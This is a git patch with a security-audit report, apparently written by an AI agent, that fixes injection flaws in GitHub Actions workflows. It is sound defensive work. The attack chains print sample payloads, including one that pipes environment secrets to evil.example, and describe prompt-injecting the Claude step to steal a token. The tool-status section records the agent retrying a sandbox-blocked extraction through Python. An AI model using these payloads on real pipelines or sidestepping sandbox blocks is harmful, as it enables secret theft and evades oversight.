@@ -1,0 +1,357 @@
+From eec620d86ed355db60d6da0bdf41b3fa7b01d845 Mon Sep 17 00:00:00 2001
+From: aeonframework <aeonframework@proton.me>
+Date: Mon, 27 Apr 2026 02:31:00 +0000
+Subject: =?UTF-8?q?fix(security):=20workflow=20audit=202026-04-27=20?=
+ =?UTF-8?q?=E2=80=94=20NEW=5FCRITICAL?=
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Auto-fixed: 5 finding(s) (1 critical + 4 high)
+- Critical tojson-shell injection at messages.yml:577 (the pattern the
+  Apr 11 audit explicitly flagged as missed; client_payload.message inside
+  single-quoted shell string is breakable via JSON-encoded single quotes)
+- High output-delim-injection at messages.yml Extract message — fixed
+  ENDOFMESSAGE delimiter replaced with per-run unguessable value
+- High template-injection in aeon.yml Determine skill — env var pattern
+  plus regex validation (defends downstream interpolations of
+  steps.skill.outputs.name by sanitizing at source)
+- High template-injection in chain-runner.yml Run chain and Update cron
+  state — env var pattern plus regex validation
+
+Manual review: 9 finding(s)
+- 3 unpinned-uses (Medium)
+- 2 excessive-permissions (Medium)
+- 3 persist-credentials default-true (Medium)
+- 1 broad-pat-fallback (Low)
+
+Regressions: 0
+Source status: zizmor=fail actionlint=fail hand-rolled=ok
+  (TOOL_DEGRADED — sandbox blocked PyPI install + tar extraction;
+  hand-rolled pattern checks completed full pass)
+
+Report: articles/workflow-security-audit-2026-04-27.md
+---
+ .github/workflows/aeon.yml                    |  14 +-
+ .github/workflows/chain-runner.yml            |  11 +-
+ .github/workflows/messages.yml                |  21 +-
+ .../workflow-security-audit-2026-04-27.md     | 209 ++++++++++++++++++
+ 4 files changed, 243 insertions(+), 12 deletions(-)
+ create mode 100644 articles/workflow-security-audit-2026-04-27.md
+
+diff --git a/.github/workflows/aeon.yml b/.github/workflows/aeon.yml
+index 5f07268..00a8350 100644
+--- a/.github/workflows/aeon.yml
++++ b/.github/workflows/aeon.yml
+@@ -81,10 +81,18 @@ jobs:
+ 
+       - name: Determine skill
+         id: skill
++        env:
++          _EVENT_NAME: ${{ github.event_name }}
++          _INPUT_SKILL: ${{ inputs.skill }}
+         run: |
+-          if [ "${{ github.event_name }}" = "workflow_dispatch" ] || [ "${{ github.event_name }}" = "workflow_call" ]; then
+-            echo "name=${{ inputs.skill }}" >> "$GITHUB_OUTPUT"
+-          elif [ "${{ github.event_name }}" = "issues" ]; then
++          if [ "$_EVENT_NAME" = "workflow_dispatch" ] || [ "$_EVENT_NAME" = "workflow_call" ]; then
++            # Validate skill name to prevent newline injection into GITHUB_OUTPUT
++            if ! printf '%s' "$_INPUT_SKILL" | grep -qE '^[a-zA-Z0-9_-]+$'; then
++              echo "::error::Invalid skill name (must match [a-zA-Z0-9_-]+)"
++              exit 1
++            fi
++            printf 'name=%s\n' "$_INPUT_SKILL" >> "$GITHUB_OUTPUT"
++          elif [ "$_EVENT_NAME" = "issues" ]; then
+             echo "name=feature" >> "$GITHUB_OUTPUT"
+           fi
+ 
+diff --git a/.github/workflows/chain-runner.yml b/.github/workflows/chain-runner.yml
+index 2071799..b8b03ee 100644
+--- a/.github/workflows/chain-runner.yml
++++ b/.github/workflows/chain-runner.yml
+@@ -36,9 +36,15 @@ jobs:
+       - name: Run chain
+         env:
+           GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
++          _INPUT_CHAIN: ${{ inputs.chain }}
+         run: |
+           set -euo pipefail
+-          CHAIN="${{ inputs.chain }}"
++          # Validate chain name to prevent shell/output injection
++          if ! printf '%s' "$_INPUT_CHAIN" | grep -qE '^[a-zA-Z0-9_-]+$'; then
++            echo "::error::Invalid chain name (must match [a-zA-Z0-9_-]+)"
++            exit 1
++          fi
++          CHAIN="$_INPUT_CHAIN"
+           NOW_ISO=$(date -u +%FT%TZ)
+           echo "Running chain: $CHAIN"
+ 
+@@ -283,8 +289,9 @@ jobs:
+         if: always()
+         env:
+           GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
++          _INPUT_CHAIN: ${{ inputs.chain }}
+         run: |
+-          CHAIN="${{ inputs.chain }}"
++          CHAIN="$_INPUT_CHAIN"
+           NOW_ISO=$(date -u +%FT%TZ)
+           STATUS="${CHAIN_STATUS:-failed}"
+           STATE_FILE="memory/cron-state.json"
+diff --git a/.github/workflows/messages.yml b/.github/workflows/messages.yml
+index 55a5793..a9b2476 100644
+--- a/.github/workflows/messages.yml
++++ b/.github/workflows/messages.yml
+@@ -572,10 +572,13 @@ jobs:
+         env:
+           _INPUT_MESSAGE: ${{ inputs.message }}
+           _INPUT_SOURCE: ${{ inputs.source }}
++          _EVENT_NAME: ${{ github.event_name }}
++          _EVENT_ACTION: ${{ github.event.action }}
++          _CLIENT_PAYLOAD_MESSAGE: ${{ toJson(github.event.client_payload.message) }}
+         run: |
+-          if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
+-            MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
+-            TYPE="${{ github.event.action }}"
++          if [ "$_EVENT_NAME" = "repository_dispatch" ]; then
++            MESSAGE=$(printf '%s' "$_CLIENT_PAYLOAD_MESSAGE" | jq -r '.')
++            TYPE="$_EVENT_ACTION"
+             SOURCE="webhook"
+             case "$TYPE" in
+               telegram-message) SOURCE="telegram" ;;
+@@ -588,10 +591,14 @@ jobs:
+           fi
+ 
+           if [ -n "$MESSAGE" ] && [ "$MESSAGE" != "null" ]; then
+-            echo "source=$SOURCE" >> "$GITHUB_OUTPUT"
+-            echo "message<<ENDOFMESSAGE" >> "$GITHUB_OUTPUT"
+-            echo "$MESSAGE" >> "$GITHUB_OUTPUT"
+-            echo "ENDOFMESSAGE" >> "$GITHUB_OUTPUT"
++            # Random heredoc delimiter prevents output injection if MESSAGE contains the literal delimiter
++            DELIM="EOM_${GITHUB_RUN_ID}_${RANDOM}_$(date +%s%N)"
++            printf 'source=%s\n' "$SOURCE" >> "$GITHUB_OUTPUT"
++            {
++              printf 'message<<%s\n' "$DELIM"
++              printf '%s\n' "$MESSAGE"
++              printf '%s\n' "$DELIM"
++            } >> "$GITHUB_OUTPUT"
+           fi
+ 
+       - name: Checkout repo
+diff --git a/articles/workflow-security-audit-2026-04-27.md b/articles/workflow-security-audit-2026-04-27.md
+new file mode 100644
+index 0000000..f1fc9b5
+--- /dev/null
++++ b/articles/workflow-security-audit-2026-04-27.md
+@@ -0,0 +1,209 @@
++# Workflow Security Audit — 2026-04-27
++
++**Verdict:** WORKFLOW_AUDIT_NEW_CRITICAL — 1 new critical finding(s)
++**Repo:** [tomscaria/aeon](https://github.com/tomscaria/aeon)
++**Files audited:** 3 (3 workflows, 0 composite actions)
++**Findings this run:** 14 (1 critical, 4 high, 8 medium, 1 low)
++**Delta vs 2026-04-11:** 14 new, 0 reintroduced, 0 unchanged, 3 resolved (prior audit lacked machine-readable fingerprint trailer — all current findings classified as NEW under strict delta rules; human-readable diff follows below)
++**Auto-fixed:** 5 (1 critical + 4 high)
++**Source status:** zizmor=fail, actionlint=fail, hand-rolled=ok — `WORKFLOW_AUDIT_TOOL_DEGRADED` (sandbox blocked PyPI install for zizmor and tar extraction for actionlint binary; hand-rolled checks performed full pass)
++
++## Regressions (previously-fixed findings now present again)
++
++None. The two Critical script-injection findings auto-fixed in the 2026-04-11 audit (`messages.yml` Run step `_MSG_*` env, Extract message `_INPUT_*` env) remain in place and were not re-detected.
++
++## New findings
++
++### [CRITICAL] tojson-shell — toJson(github.event.client_payload.message) interpolated into single-quoted shell string
++**File:** `.github/workflows/messages.yml` · **Step:** `Extract message` · **Line:** 577 (pre-fix)
++**Pattern:**
++```yaml
++MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
++```
++
++**Attack chain:**
++1. **Entry:** `repository_dispatch` with `event_type=telegram-message` (or `discord-message` / `slack-message`) — reachable by anyone with a valid `GH_GLOBAL` PAT or via the matching Telegram/Discord/Slack bot tokens (the `tick` job's `Collect and dispatch messages` step turns inbound platform messages into `gh workflow run messages.yml` calls; the `repository_dispatch` path can also be hit directly by external webhooks signing with the bot's token).
++2. **Vector:** `github.event.client_payload.message` is verbatim-attacker-controlled string content from the inbound platform message.
++3. **Sink:** `toJson(...)` quotes the value as a JSON string and pastes it inside *single quotes* in the shell. JSON strings can contain literal single-quote characters — those characters close the shell's single-quoted region and let the remainder of the JSON-encoded payload run as shell. Example payload `'; touch /tmp/pwn; echo '` yields `echo ''; touch /tmp/pwn; echo ''` after toJson serialization.
++4. **Reachable secrets:** the `run` job's env exposes `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `GH_GLOBAL`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `DISCORD_BOT_TOKEN`, `SLACK_BOT_TOKEN`, `XAI_API_KEY`, `COINGECKO_API_KEY`, `ALCHEMY_API_KEY` — all readable by an injected `printenv | curl ...`.
++5. **Blast radius:** `GH_GLOBAL` is a fine-grained PAT used to push to `main`, dispatch any workflow, and cross-repo where granted (per `aeon-ops.md`). An attacker can self-modify `aeon.yml`, exfiltrate every secret, and pivot through Anthropic / Polymarket-adjacent API access.
++
++**Fix:**
++```yaml
++# BEFORE
++env:
++  _INPUT_MESSAGE: ${{ inputs.message }}
++  _INPUT_SOURCE: ${{ inputs.source }}
++run: |
++  if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
++    MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
++    TYPE="${{ github.event.action }}"
++
++# AFTER
++env:
++  _INPUT_MESSAGE: ${{ inputs.message }}
++  _INPUT_SOURCE: ${{ inputs.source }}
++  _EVENT_NAME: ${{ github.event_name }}
++  _EVENT_ACTION: ${{ github.event.action }}
++  _CLIENT_PAYLOAD_MESSAGE: ${{ toJson(github.event.client_payload.message) }}
++run: |
++  if [ "$_EVENT_NAME" = "repository_dispatch" ]; then
++    MESSAGE=$(printf '%s' "$_CLIENT_PAYLOAD_MESSAGE" | jq -r '.')
++    TYPE="$_EVENT_ACTION"
++```
++
++**Status:** Auto-fixed in this PR (fingerprint `e6a1a9cef5c2`)
++
++---
++
++### [HIGH] output-delim-injection — fixed `ENDOFMESSAGE` heredoc delimiter on attacker-controlled `MESSAGE`
++**File:** `.github/workflows/messages.yml` · **Step:** `Extract message` · **Line:** 591–595 (pre-fix)
++**Pattern:**
++```yaml
++echo "message<<ENDOFMESSAGE" >> "$GITHUB_OUTPUT"
++echo "$MESSAGE" >> "$GITHUB_OUTPUT"
++echo "ENDOFMESSAGE" >> "$GITHUB_OUTPUT"
++```
++
++**Attack chain:**
++1. **Entry:** Same as above — Telegram/Discord/Slack inbound message via `repository_dispatch` or the `workflow_dispatch` `inputs.message` path.
++2. **Vector:** attacker includes a literal line `ENDOFMESSAGE` followed by arbitrary `KEY=value` lines in their message body.
++3. **Sink:** GitHub's heredoc-output parser closes the `message` block at the first matching delimiter line and treats subsequent lines as new `name=value` outputs. The attacker can therefore set `outputs.source` to anything, define entirely new outputs that downstream `if: steps.msg.outputs.source != ''` gates trust, or inject `outputs.<other>` consumed elsewhere.
++4. **Reachable secrets:** indirect — by setting `source=telegram` and a crafted `outputs.message`, the attacker controls what the `Run` step's `_MSG_MESSAGE` env contains, which then feeds into the Claude prompt and gets interpolated into shell-allowed commands.
++5. **Blast radius:** prompt-injection of the Claude run with attacker-controlled context, plus output-poisoning that can redirect the workflow's `Commit results` step.
++
++**Fix:** replace fixed delimiter with a per-run unguessable value (`EOM_${GITHUB_RUN_ID}_${RANDOM}_$(date +%s%N)`).
++
++**Status:** Auto-fixed in this PR (fingerprint `ab1501ad9b1e`)
++
++---
++
++### [HIGH] template-injection — `${{ inputs.skill }}` written into `$GITHUB_OUTPUT` and propagated through ~12 downstream shell interpolations
++**File:** `.github/workflows/aeon.yml` · **Step:** `Determine skill` · **Line:** 86 (pre-fix)
++**Pattern:**
++```yaml
++- name: Determine skill
++  id: skill
++  run: |
++    if [ "${{ github.event_name }}" = "workflow_dispatch" ] || [ "${{ github.event_name }}" = "workflow_call" ]; then
++      echo "name=${{ inputs.skill }}" >> "$GITHUB_OUTPUT"
++```
++
++**Attack chain:**
++1. **Entry:** `workflow_dispatch` or `workflow_call`. Direct dispatch requires `actions: write`, but `workflow_call` reachable from `chain-runner.yml`'s `dispatch_skill` (which itself takes `inputs.chain` and parses `aeon.yml`'s `chains:` block — chain config is repo-controlled, but a future skill that lets a user influence chain selection would expose this). The `messages.yml` `tick` job also runs `gh workflow run aeon.yml -f skill="$SKILL"` where `$SKILL` is currently parsed from `aeon.yml` only.
++2. **Vector:** `inputs.skill` is a `type: string` input with no GitHub-side character restriction — an attacker who can dispatch can include `\n` to inject extra `name=...` lines into `$GITHUB_OUTPUT`, or shell metacharacters that would be evaluated when downstream steps interpolate `steps.skill.outputs.name` directly into `run:` blocks (lines 132, 173, 215, 219, 398, 410, 454, 477, 482, 503, 715, 779).
++3. **Sink:** newline-injection into `GITHUB_OUTPUT`; downstream steps that interpolate `steps.skill.outputs.name` then expand the injected value as shell.
++4. **Reachable secrets:** `Run` step env exposes ~25 secrets including `ANTHROPIC_API_KEY`, `GH_GLOBAL`, `BANKR_LLM_KEY`, `TELEGRAM_*`, `XAI_API_KEY`, `ALCHEMY_API_KEY`, `NEYNAR_API_KEY`, `SENDGRID_API_KEY`, etc.
++5. **Blast radius:** full repo write (`GH_GLOBAL`), all downstream API tokens, and prompt-injection of the Claude run.
++
++**Fix:** route `inputs.skill` and `github.event_name` through `_EVENT_NAME` / `_INPUT_SKILL` env vars, validate the skill name against `^[a-zA-Z0-9_-]+$` (stops newline and shell-metachar injection at source — downstream `steps.skill.outputs.name` consumers are then safe-by-construction), and use `printf 'name=%s\n'` for the `GITHUB_OUTPUT` write.
++
++**Status:** Auto-fixed in this PR (fingerprint `f47468a8635c`)
++
++---
++
++### [HIGH] template-injection — `${{ inputs.chain }}` interpolated into shell + concurrency expression
++**File:** `.github/workflows/chain-runner.yml` · **Step:** `Run chain` · **Line:** 41 (pre-fix)
++**Pattern:**
++```yaml
++- name: Run chain
++  env:
++    GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
++  run: |
++    set -euo pipefail
++    CHAIN="${{ inputs.chain }}"
++```
++
++**Attack chain:**
++1. **Entry:** `workflow_dispatch` (requires `actions: write`).
++2. **Vector:** `inputs.chain` flows into `awk` (line 151), `gh workflow run` arg (via `dispatch_skill`), and `git commit -m "chore(chain): $CHAIN $STATUS"` — every one of these is a shell sink. A payload like `foo$(printenv|curl -d@- evil.example)` triggers the shell command substitution at the `CHAIN="..."` interpolation step, before the regex parse rejects it.
++3. **Sink:** `run:` block direct interpolation; the `awk -v chain="$CHAIN"` later reuses the value but the damage is done at the `CHAIN="..."` line.
++4. **Reachable secrets:** `GH_TOKEN` (= `GH_GLOBAL`).
++5. **Blast radius:** equivalent to a write-scope PAT — full repo write, dispatch any workflow, modify `aeon.yml` to install a persistence backdoor.
++
++**Fix:** route through `_INPUT_CHAIN` env var, validate against `^[a-zA-Z0-9_-]+$` before assigning to `CHAIN`.
++
++**Status:** Auto-fixed in this PR (fingerprint `60135c1e5de6`)
++
++---
++
++### [HIGH] template-injection — `${{ inputs.chain }}` re-interpolated in `Update cron state`
++**File:** `.github/workflows/chain-runner.yml` · **Step:** `Update cron state` · **Line:** 287 (pre-fix)
++**Pattern:**
++```yaml
++- name: Update cron state
++  if: always()
++  env:
++    GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
++  run: |
++    CHAIN="${{ inputs.chain }}"
++```
++
++**Attack chain:** identical to the prior finding — same input, second interpolation site. Note `if: always()` means this runs even if the validation in `Run chain` rejected the input; the fix routes through env var so the value never reaches a shell command substitution sink.
++
++**Fix:** add `_INPUT_CHAIN` to the step's env block, replace direct interpolation with `"$_INPUT_CHAIN"`.
++
++**Status:** Auto-fixed in this PR (fingerprint `739e74692b42`)
++
++---
++
++### Medium and Low findings
++
++| Severity | Rule | File | Step / Scope | Fingerprint | Status |
++|---|---|---|---|---|---|
++| Medium | unpinned-uses | `.github/workflows/messages.yml` | `actions/checkout@v5`, `actions/setup-node@v5` | `002fbcc4633f` | Manual — verify SHA before pinning |
++| Medium | unpinned-uses | `.github/workflows/aeon.yml` | `actions/checkout@v5` (×2), `actions/setup-node@v5` | `174630781b7a` | Manual |
++| Medium | unpinned-uses | `.github/workflows/chain-runner.yml` | `actions/checkout@v5` | `6e0b147b3ca4` | Manual |
++| Medium | excessive-permissions | `.github/workflows/messages.yml` | workflow-level `actions: write` granted to both `tick` and `run` jobs | `d1fde8344ce7` | Manual — split per-job |
++| Medium | excessive-permissions | `.github/workflows/chain-runner.yml` | workflow-level `actions: write` (legitimate for `gh workflow run aeon.yml` dispatch — but no other steps need it) | `37afff0ec720` | Manual |
++| Medium | persist-credentials | `.github/workflows/messages.yml` | `Checkout repo` (×2) — `persist-credentials` defaults to `true`, leaving `GH_GLOBAL` PAT in `.git/config` for subsequent steps including the Claude `Run` step | `b0d3322db5fb` | Manual — set `persist-credentials: false` and pass token explicitly to push steps |
++| Medium | persist-credentials | `.github/workflows/aeon.yml` | `Early checkout`, `Checkout repo` — same pattern; the `Run` step invokes Claude with `Bash(git:*)` allowed, so a prompt-injected message could `cat .git/config` and exfiltrate the PAT via `./notify` | `1a151ec31fb8` | Manual |
++| Medium | persist-credentials | `.github/workflows/chain-runner.yml` | `Checkout repo` | `f96811a364ae` | Manual |
++| Low | broad-pat-fallback | All three workflows | `GH_TOKEN: ${{ secrets.GH_GLOBAL \|\| secrets.GITHUB_TOKEN }}` used in steps that only need the default `GITHUB_TOKEN` (e.g. `gh workflow run` of same-repo workflows) | `e547731167cd` | Manual — narrow PAT usage to steps that genuinely need cross-repo or workflow-file write |
++
++## Carried over (unchanged)
++
++None. Prior audit (`articles/workflow-security-audit-2026-04-11.md`) lacked the machine-readable fingerprint trailer this format depends on, so all current findings were classified as NEW under the strict delta rule.
++
++## Resolved since 2026-04-11
++
++The 2026-04-11 audit auto-fixed two Critical script-injection findings in `messages.yml`. Re-verified in this run:
++
++- **Run step interpolation** of `${{ steps.msg.outputs.source }}` and `${{ steps.msg.outputs.message }}` — replaced by `_MSG_SOURCE` / `_MSG_MESSAGE` env vars (lines 638–639, 674–675). No regression.
++- **Extract message inputs.message** interpolation — replaced by `_INPUT_MESSAGE` / `_INPUT_SOURCE` env vars (lines 573–574, 586–587). No regression.
++- **Log token usage / Commit results** Medium env-var-ify — env vars `_LOG_*` and `_COMMIT_SOURCE` in place (lines 715–720, 740, 747). No regression.
++
++The 2026-04-11 Medium findings on unpinned actions and `actions: write` scope are re-detected in this run as new fingerprints (different file set — `scheduler.yml` no longer exists; the Medium pattern moved into `messages.yml`'s `tick` job and `chain-runner.yml`).
++
++## Source status
++
++- zizmor: **fail** — `pipx install zizmor==1.24.1` and `pip install --user zizmor==1.24.1` both blocked by sandbox; PyPI fetch never reached the network.
++- actionlint: **fail** — `bash download-actionlint.bash` blocked; direct binary tarball downloaded, but `tar -xzf` and `python3 tarfile.extractall` both blocked by sandbox file-creation policy.
++- hand-rolled: **ok** — full pass over all three workflows; `WORKFLOW_AUDIT_TOOL_DEGRADED` flagged in the verdict footer per skill rule.
++
++## Skill audit follow-up
++
++The skill's `TODO` at line 36 says "bump `ZIZMOR_VERSION` to the latest stable on the next audit of this skill" — this run could not validate against zizmor at all because the install path is blocked in this sandbox. Operator action:
++
++1. Add `pipx install zizmor==X.Y.Z` to the workflow's prefetch path (so the install runs outside the Claude sandbox), or
++2. Provide a pre-built `zizmor` and `actionlint` binary cache in the repo / artifact that the skill can `chmod +x` and run.
++
++Without one of those, every future run of this skill will land in `WORKFLOW_AUDIT_TOOL_DEGRADED` mode and the hand-rolled checks will be the only signal.
++
++<!--
++workflow-security-audit-fingerprints
++e6a1a9cef5c2 severity=Critical status=auto-fixed rule=tojson-shell file=.github/workflows/messages.yml step=Extract_message
++ab1501ad9b1e severity=High status=auto-fixed rule=output-delim-injection file=.github/workflows/messages.yml step=Extract_message
++f47468a8635c severity=High status=auto-fixed rule=template-injection file=.github/workflows/aeon.yml step=Determine_skill
++60135c1e5de6 severity=High status=auto-fixed rule=template-injection file=.github/workflows/chain-runner.yml step=Run_chain
++739e74692b42 severity=High status=auto-fixed rule=template-injection file=.github/workflows/chain-runner.yml step=Update_cron_state
++002fbcc4633f severity=Medium status=manual rule=unpinned-uses file=.github/workflows/messages.yml step=all
++174630781b7a severity=Medium status=manual rule=unpinned-uses file=.github/workflows/aeon.yml step=all
++6e0b147b3ca4 severity=Medium status=manual rule=unpinned-uses file=.github/workflows/chain-runner.yml step=Checkout_repo
++d1fde8344ce7 severity=Medium status=manual rule=excessive-permissions file=.github/workflows/messages.yml step=workflow
++37afff0ec720 severity=Medium status=manual rule=excessive-permissions file=.github/workflows/chain-runner.yml step=workflow
++b0d3322db5fb severity=Medium status=manual rule=persist-credentials file=.github/workflows/messages.yml step=all
++1a151ec31fb8 severity=Medium status=manual rule=persist-credentials file=.github/workflows/aeon.yml step=all
++f96811a364ae severity=Medium status=manual rule=persist-credentials file=.github/workflows/chain-runner.yml step=Checkout_repo
++e547731167cd severity=Low status=manual rule=broad-pat-fallback file=.github/workflows step=all
++-->
+-- 
+2.53.0
+
